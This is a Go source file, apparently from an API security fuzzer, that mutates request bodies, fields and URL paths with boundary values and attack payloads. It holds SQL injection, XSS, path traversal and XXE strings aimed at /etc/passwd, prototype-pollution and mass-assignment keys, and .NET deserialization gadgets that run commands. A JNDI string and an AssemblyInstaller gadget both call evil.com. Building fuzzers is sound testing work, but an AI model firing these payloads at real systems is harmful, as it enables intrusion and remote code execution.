package main

import (
	"encoding/json"
	"fmt"
	"math"
	"math/rand"
	"regexp"
	"strconv"
	"strings"
)

// mutation_engine.go — Payload mutation engine: JSON body havoc, type confusion,
// string/integer/UUID/datetime/path mutations, MOpt category dispatch.

func mutateJSONBody(body string, havocDepth int) (string, string) {
	if !reJSONStartObj.MatchString(body) {
		return body, ""
	}
	var js any
	if err := json.Unmarshal([]byte(body), &js); err != nil {
		return body, ""
	}
	obj, ok := js.(map[string]any)
	if !ok {
		return body, ""
	}
	// Pre-compute keys once to avoid repeated mapKeysAny allocations per operation.
	keys := mapKeysAny(obj)
	ops := []func(map[string]any, []string) (bool, string){
		func(m map[string]any, ks []string) (bool, string) {
			if len(ks) == 0 {
				return false, ""
			}
			k := ks[rand.Intn(len(ks))]
			delete(m, k)
			return true, "json_del_key"
		},
		func(m map[string]any, ks []string) (bool, string) {
			if len(ks) == 0 {
				return false, ""
			}
			k := ks[rand.Intn(len(ks))]
			m[k] = nil
			return true, "json_null_key"
		},
		func(m map[string]any, ks []string) (bool, string) {
			if len(ks) == 0 {
				return false, ""
			}
			k := ks[rand.Intn(len(ks))]
			sv := flipJSONScalar(m[k])
			m[k] = sv
			return true, "json_flip_scalar"
		},
		// Type confusion: change a value's type (string→number, number→string, etc.)
		func(m map[string]any, ks []string) (bool, string) {
			if len(ks) == 0 {
				return false, ""
			}
			k := ks[rand.Intn(len(ks))]
			m[k] = jsonTypeConfuse(m[k])
			return true, "json_type_confuse"
		},
		// Mass assignment: inject privilege-escalation keys
		func(m map[string]any, _ []string) (bool, string) {
			injections := []struct {
				k string
				v any
			}{
				{"isAdmin", true}, {"role", "admin"}, {"is_superuser", true},
				{"permissions", []string{"*"}}, {"verified", true}, {"email_verified", true},
				{"__proto__", map[string]any{"isAdmin": true}},
				{"$type", "System.Object"}, {"active", true}, {"banned", false},
				{"price", 0.01}, {"discount", 99.99}, {"quantity", 999999},
			}
			inj := injections[rand.Intn(len(injections))]
			m[inj.k] = inj.v
			return true, "json_mass_assign"
		},
		// Deep nesting: wrap a value in nested objects to trigger stack overflow
		func(m map[string]any, ks []string) (bool, string) {
			if len(ks) == 0 {
				return false, ""
			}
			k := ks[rand.Intn(len(ks))]
			depth := []int{10, 50, 100}[rand.Intn(3)]
			inner := map[string]any{"v": m[k]}
			for i := 0; i < depth; i++ {
				inner = map[string]any{"n": inner}
			}
			m[k] = inner
			return true, "json_deep_nest"
		},
		// Array overflow: replace a value with a large array
		func(m map[string]any, ks []string) (bool, string) {
			if len(ks) == 0 {
				return false, ""
			}
			k := ks[rand.Intn(len(ks))]
			sz := []int{100, 1000, 10000}[rand.Intn(3)]
			arr := make([]any, sz)
			for i := range arr {
				arr[i] = i
			}
			m[k] = arr
			return true, "json_array_overflow"
		},
		// Duplicate key with different type (JSON spec allows, parsers differ)
		func(m map[string]any, ks []string) (bool, string) {
			if len(ks) == 0 {
				return false, ""
			}
			k := ks[rand.Intn(len(ks))]
			m[k+""] = jsonTypeConfuse(m[k])
			return true, "json_dup_key"
		},
		// .NET deserialization $type injection into existing object
		func(m map[string]any, _ []string) (bool, string) {
			gadgets := []string{
				"System.IO.FileInfo, System.IO.FileSystem",
				"System.Diagnostics.Process, System",
				"System.Windows.Data.ObjectDataProvider, PresentationFramework",
				"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install",
			}
			m["$type"] = gadgets[rand.Intn(len(gadgets))]
			return true, "json_dotnet_deser"
		},
	}
	labels := []string{}
	rounds := clampInt(havocDepth, 1, 3)
	for i := 0; i < rounds; i++ {
		perm := rand.Perm(len(ops))
		for _, idx := range perm {
			if ok, name := ops[idx](obj, keys); ok {
				labels = append(labels, name)
				// Re-extract keys after mutation since the map may have changed.
				keys = mapKeysAny(obj)
				break
			}
		}
	}
	if len(labels) == 0 {
		return body, ""
	}
	buf, err := json.Marshal(obj)
	if err != nil {
		return body, ""
	}
	return string(buf), strings.Join(dedupStrings(labels), "+")
}

// jsonTypeConfuse returns a value of a different type than the input.
func jsonTypeConfuse(v any) any {
	switch v.(type) {
	case string:
		return []any{0, true, nil, 42.5}[rand.Intn(4)]
	case float64:
		return []any{"NaN", true, nil, "0"}[rand.Intn(4)]
	case bool:
		return []any{1, "true", nil, 0}[rand.Intn(4)]
	case nil:
		return []any{0, "", false, []any{}}[rand.Intn(4)]
	case []any:
		return map[string]any{"0": "converted"}
	case map[string]any:
		return []any{"converted"}
	default:
		return nil
	}
}

func flipJSONScalar(v any) any {
	switch tv := v.(type) {
	case bool:
		if tv {
			return false
		}
		return true
	case float64:
		return []float64{0.0, -1.0, tv * -1.0, 1e308}[rand.Intn(4)]
	case string:
		opts := []string{"", tv + "\u0000", strings.Repeat("A", 2048), "' OR '1'='1", "<script>alert(1)</script>", "not-a-date", "00000000-0000-0000-0000-000000000000"}
		return opts[rand.Intn(len(opts))]
	case nil:
		opts := []any{"null", 0, "", false}
		return opts[rand.Intn(len(opts))]
	default:
		return v
	}
}

func mutateAny(value, valueType string) (string, string) {
	t := strings.ToLower(strings.TrimSpace(valueType))
	switch t {
	case "string", "group", "unknown", "custom_payload", "custom_payload_header", "custom_payload_query", "custom_payload_uuid4_suffix":
		val, subcat := mutateStringCategorized(value)
		return val, subcat
	case "int", "integer":
		return mutateInt(value), "mutate_int"
	case "number", "float", "double", "decimal":
		return mutateNumber(value), "mutate_number"
	case "bool", "boolean":
		return mutateBool(value), "mutate_bool"
	case "datetime", "date", "date-time":
		return mutateDateTime(value), "mutate_datetime"
	case "uuid", "guid":
		return mutateUUID(value), "mutate_uuid"
	case "object":
		return mutateObject(value), "mutate_object"
	default:
		val, subcat := mutateStringCategorized(value)
		return val, subcat
	}
}

func mutateHavoc(value, valueType string, depth int) (string, string) {
	v := value
	names := []string{}
	for i := 0; i < clampInt(depth, 1, 4); i++ {
		var n string
		v, n = mutateAny(v, valueType)
		names = append(names, n)
	}
	return v, "havoc(" + strings.Join(names, "+") + ")"
}

// mutateStringCategorized picks a payload using MOpt-weighted category selection.
// Returns (mutated_value, sub_category_label) for tracking which category succeeds.
func mutateStringCategorized(v string) (string, string) {
	// 10% chance: value-derived mutations (reverse, null byte) that don't fit a category.
	if rand.Float64() < 0.10 {
		misc := []string{reverse(v), v + "\x00"}
		return misc[rand.Intn(len(misc))], "mcat_misc"
	}
	cat := pickMutationCategory()
	return cat.Payloads[rand.Intn(len(cat.Payloads))], "mcat_" + cat.Name
}

func mutateString(v string) string {
	val, _ := mutateStringCategorized(v)
	return val
}

func mutateInt(v string) string {
	x, _ := strconv.Atoi(strings.TrimSpace(v))
	cands := []int{0, 1, -1, 2, -2, 127, 128, -128, 255, 256, 32767, 32768, 65535, 65536, math.MaxInt32, math.MinInt32, x + 1, x - 1, x * 2}
	return strconv.Itoa(cands[rand.Intn(len(cands))])
}

func mutateNumber(v string) string {
	x, _ := strconv.ParseFloat(strings.TrimSpace(v), 64)
	cands := []string{"0.0", "-0.0", "0.1", "-0.1", "1e308", "-1e308", "1e-308", "999999999.999999", "0.0000000001", "3.141592653589793", fmt.Sprintf("%f", x+0.001), fmt.Sprintf("%f", x*-1.0)}
	return cands[rand.Intn(len(cands))]
}

func mutateBool(_ string) string {
	cands := []string{"true", "false", "null", "0", "1", "\"true\"", "yes"}
	return cands[rand.Intn(len(cands))]
}

func mutateDateTime(_ string) string {
	cands := []string{"0001-01-01T00:00:00Z", "9999-12-31T23:59:59Z", "1970-01-01T00:00:00Z", "2038-01-19T03:14:07Z", "", "not-a-date", "2024-13-45T99:99:99Z", "2020-02-29T12:00:00Z"}
	return cands[rand.Intn(len(cands))]
}

func mutateBusinessID(runtimeIDVals []string) string {
	prefixes := []string{"ID", "OBJ", "ENT", "RES", "REF", "USR", "ACC"}
	for _, v := range runtimeIDVals {
		vv := strings.TrimSpace(v)
		if vv == "" {
			continue
		}
		parts := splitNonAlnum(vv)
		if len(parts) > 0 && len(parts[0]) >= 2 {
			p := strings.ToUpper(parts[0])
			if len(p) <= 8 {
				prefixes = append(prefixes, p)
			}
		}
	}
	prefixes = uniqStrings(prefixes)
	p := prefixes[rand.Intn(len(prefixes))]
	strategies := []string{
		fmt.Sprintf("%s-%04d", p, rand.Intn(10000)),
		fmt.Sprintf("%s-%04d-%04d", p, rand.Intn(10000), rand.Intn(10000)),
		fmt.Sprintf("%s-%04d-%04d-%04d", p, rand.Intn(10000), rand.Intn(10000), rand.Intn(10000)),
		fmt.Sprintf("%s-0000", p),
		fmt.Sprintf("%s-9999", p),
		strings.ToLower(fmt.Sprintf("%s-%04d", p, rand.Intn(10000))),
	}
	return strategies[rand.Intn(len(strategies))]
}

func mutateUUID(_ string) string {
	cands := []string{"00000000-0000-0000-0000-000000000000", "ffffffff-ffff-ffff-ffff-ffffffffffff", "", "not-a-uuid", "12345", "' OR '1'='1", "566048da-ed19-4cd3-8e0a-b7e0e1ec4d72"}
	if rand.Float64() < 0.35 {
		return mutateBusinessID(nil)
	}
	return cands[rand.Intn(len(cands))]
}

func mutateObject(_ string) string {
	cands := []string{
		"{}",
		"null",
		"[]",
		// Prototype pollution
		`{"__proto__":{"isAdmin":true}}`,
		`{"constructor":{"prototype":{"isAdmin":true}}}`,
		// JSON.NET deserialization gadgets — triggers TypeNameHandling in .NET
		`{"$type":"System.IO.FileInfo, System.IO.FileSystem","FileName":"/etc/passwd"}`,
		`{"$type":"System.Diagnostics.Process, System","FileName":"id","Arguments":""}`,
		`{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","FileName":"id"}}`,
		`{"$type":"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install","Path":"http://evil.com/payload.dll"}`,
		`{"$type":"System.Activities.Presentation.WorkflowDesigner, System.Activities.Presentation","PropertyInspectorFontAndColorData":"<xml/>"}`,
		`{"$type":"Microsoft.IdentityModel.Claims.WindowsClaimsIdentity, Microsoft.IdentityModel","label":"evil"}`,
		// Mass assignment / privilege escalation
		`{"isAdmin":true,"role":"admin","permissions":["*"],"verified":true}`,
		`{"__proto__":{"admin":true},"isAdmin":true,"role":"superuser","__admin":1}`,
		// XXE via JSON-XML bridges (Spring, etc.)
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
		// Deeply nested structure — stack overflow / recursion DoS
		strings.Repeat(`{"a":`, 100) + `1` + strings.Repeat(`}`, 100),
		// Type confusion
		"true",
		"0",
		`""`,
		"[]",
	}
	return cands[rand.Intn(len(cands))]
}

// pathIDSegmentRe matches the last resource-ID-like segment in a URL path:
// digits (e.g. /product/42), UUIDs, or short alphanumeric tokens.
var pathIDSegmentRe = regexp.MustCompile(`/(\d+|[0-9a-fA-F\-]{8,36})(/|$|\?)`)

// pathMutationValues are tried in place of resource-ID path segments.
// Values must be safe to embed in a URL path segment (no { } $ unencoded slashes).
// Injection payloads are URL-encoded so they don't corrupt routing or the UI endpoint table.
var pathMutationValues = []string{
	"0", "-1", "1", "99999999", "2147483647", "-2147483648",
	"9999999999999999999",
	"null", "undefined", "NaN",
	// SQL injection — encoded for path safety
	"%27%20OR%20%271%27%3D%271",
	"%27%3B%20DROP%20TABLE%20users%3B--",
	// Path traversal
	"..%2F..%2F..%2Fetc%2Fpasswd",
	"..%252f..%252f..%252fetc%252fpasswd",
	"....%2F....%2F....%2Fetc%2Fpasswd",
	// JNDI — encoded; server-side may decode before logging
	"%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%7D",
	// SSTI
	"%7B%7B7*7%7D%7D",
	// Command injection encoded
	"%3Bid",
	"%7Cid",
	"00000000-0000-0000-0000-000000000000",
	"ffffffff-ffff-ffff-ffff-ffffffffffff",
	strings.Repeat("A", 128),
	"foo",
	"1;",
	"'",
	"<img",
}

// mutatePath replaces the last ID-like segment in the URL path with a boundary or injection value.
// Returns ("", "") when no mutable segment is found.
func mutatePath(path string) (string, string) {
	// Split off query string to avoid corrupting it.
	base, query := path, ""
	if i := strings.Index(path, "?"); i >= 0 {
		base, query = path[:i], path[i:]
	}
	loc := pathIDSegmentRe.FindStringIndex(base)
	if loc == nil {
		return "", ""
	}
	// loc[0]+1 is the start of the captured ID (skip the leading '/').
	segStart := loc[0] + 1
	// End of the ID token: find the next '/', '?' or end of string.
	segEnd := segStart
	for segEnd < len(base) && base[segEnd] != '/' && base[segEnd] != '?' {
		segEnd++
	}
	newVal := pathMutationValues[rand.Intn(len(pathMutationValues))]
	mutated := base[:segStart] + newVal + base[segEnd:] + query
	return mutated, "mutate_path"
}
